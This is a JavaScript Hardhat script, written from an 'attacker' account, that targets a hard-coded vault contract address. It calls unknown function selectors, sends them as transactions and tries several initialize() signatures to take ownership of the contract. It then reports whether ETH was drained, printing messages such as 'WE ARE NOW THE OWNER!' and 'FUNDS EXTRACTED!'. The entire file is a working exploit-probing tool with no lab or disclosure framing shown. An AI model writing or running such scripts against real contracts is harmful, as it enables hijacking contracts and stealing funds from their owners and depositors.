const { ethers } = require("hardhat");

const VAULT_ADDRESS = "0xA69babEF1cA67A37Ffaf7a485DfFF3382056e78C";

async function main() {
  console.log("\n🔍 PROBING UNKNOWN FUNCTIONS");
  console.log("=====================================");
  
  const [attacker] = await ethers.getSigners();
  console.log("Attacker:", attacker.address);
  
  // Get gas settings
  const feeData = await ethers.provider.getFeeData();
  const gasSettings = {
    maxFeePerGas: feeData.maxFeePerGas * 2n,
    maxPriorityFeePerGas: feeData.maxPriorityFeePerGas * 2n,
    gasLimit: 3000000
  };
  
  // Initial balance
  const vaultBalanceBefore = await ethers.provider.getBalance(VAULT_ADDRESS);
  console.log("\nVault balance:", ethers.formatEther(vaultBalanceBefore), "ETH");
  
  // Interesting unknown selectors
  const unknownSelectors = [
    "0x60c7d295", // Returns an address
    "0x1ae4a59f", // Unknown
    "0x565b6000", // Unknown
    "0x8bf4515c", // Unknown
    "0x7ed0c3b2", // Unknown
    "0xb9903310", // Unknown
    "0xb9903314", // Unknown (similar to above)
    "0x029f52e2", // Unknown
    "0x7cd4689b", // Unknown
    "0x30195bca", // Unknown
  ];
  
  console.log("\n📊 Testing unknown functions...");
  
  for (const selector of unknownSelectors) {
    console.log(`\n🔧 Testing ${selector}...`);
    
    try {
      // First, try calling with no parameters
      const result = await attacker.call({
        to: VAULT_ADDRESS,
        data: selector
      });
      
      console.log("✅ Works with no params! Result:", result.slice(0, 66));
      
      // If it returns an address, decode it
      if (result.length >= 66) {
        const decoded = "0x" + result.slice(26, 66);
        console.log("   Decoded address:", decoded);
        
        // Check if this address is a contract
        const code = await ethers.provider.getCode(decoded);
        if (code !== "0x") {
          console.log("   ⚡ This is a CONTRACT!");
        }
      }
      
      // Now try calling it as a transaction
      try {
        const tx = await attacker.sendTransaction({
          to: VAULT_ADDRESS,
          data: selector,
          ...gasSettings
        });
        const receipt = await tx.wait();
        console.log("   📤 Transaction successful! Gas:", receipt.gasUsed.toString());
        
        // Check if balance changed
        const balanceNow = await ethers.provider.getBalance(VAULT_ADDRESS);
        if (balanceNow !== vaultBalanceBefore) {
          console.log("   💰 BALANCE CHANGED!");
        }
      } catch (txError) {
        console.log("   ❌ Transaction failed:", txError.message.slice(0, 40));
      }
      
    } catch (error) {
      // Try with common parameter patterns
      const paramPatterns = [
        { name: "address", data: ethers.AbiCoder.defaultAbiCoder().encode(["address"], [attacker.address]) },
        { name: "uint256", data: ethers.AbiCoder.defaultAbiCoder().encode(["uint256"], [ethers.parseEther("1")]) },
        { name: "bool", data: ethers.AbiCoder.defaultAbiCoder().encode(["bool"], [true]) },
        { name: "address,uint256", data: ethers.AbiCoder.defaultAbiCoder().encode(["address", "uint256"], [attacker.address, ethers.parseEther("1")]) }
      ];
      
      for (const pattern of paramPatterns) {
        try {
          const calldata = selector + pattern.data.slice(2);
          const result = await attacker.call({
            to: VAULT_ADDRESS,
            data: calldata
          });
          console.log(`✅ Works with ${pattern.name}! Result:`, result.slice(0, 66));
          break;
        } catch (e) {
          // Continue trying
        }
      }
    }
  }
  
  // Try initialize functions (common patterns)
  console.log("\n🎯 Testing initialization patterns...");
  const initSelectors = [
    { selector: "0xc4d66de8", name: "initialize(address)" }, // Common proxy init
    { selector: "0x485cc955", name: "initialize(address,address)" },
    { selector: "0xfe4b84df", name: "initialize(uint256)" },
    { selector: "0x8129fc1c", name: "initialize()" },
  ];
  
  for (const init of initSelectors) {
    try {
      let calldata = init.selector;
      if (init.name.includes("address")) {
        calldata += ethers.AbiCoder.defaultAbiCoder().encode(["address"], [attacker.address]).slice(2);
      } else if (init.name.includes("uint256")) {
        calldata += ethers.AbiCoder.defaultAbiCoder().encode(["uint256"], [1]).slice(2);
      }
      
      const tx = await attacker.sendTransaction({
        to: VAULT_ADDRESS,
        data: calldata,
        ...gasSettings
      });
      
      await tx.wait();
      console.log(`✅ ${init.name} executed!`);
      
      // Check if we're now the owner
      const ownerCall = await attacker.call({
        to: VAULT_ADDRESS,
        data: "0x8da5cb5b"
      });
      const owner = "0x" + ownerCall.slice(26);
      if (owner.toLowerCase() === attacker.address.toLowerCase()) {
        console.log("🎉 WE ARE NOW THE OWNER!");
      }
    } catch (e) {
      // Silent fail
    }
  }
  
  // Final check
  const vaultBalanceAfter = await ethers.provider.getBalance(VAULT_ADDRESS);
  const extracted = vaultBalanceBefore - vaultBalanceAfter;
  
  console.log("\n📊 FINAL RESULTS:");
  console.log("Vault balance change:", ethers.formatEther(extracted), "ETH");
  
  if (extracted > 0n) {
    console.log("\n🏆 FUNDS EXTRACTED!");
  }
}

main().catch((error) => {
  console.error("\n💥 Script error:", error);
  process.exit(1);
});
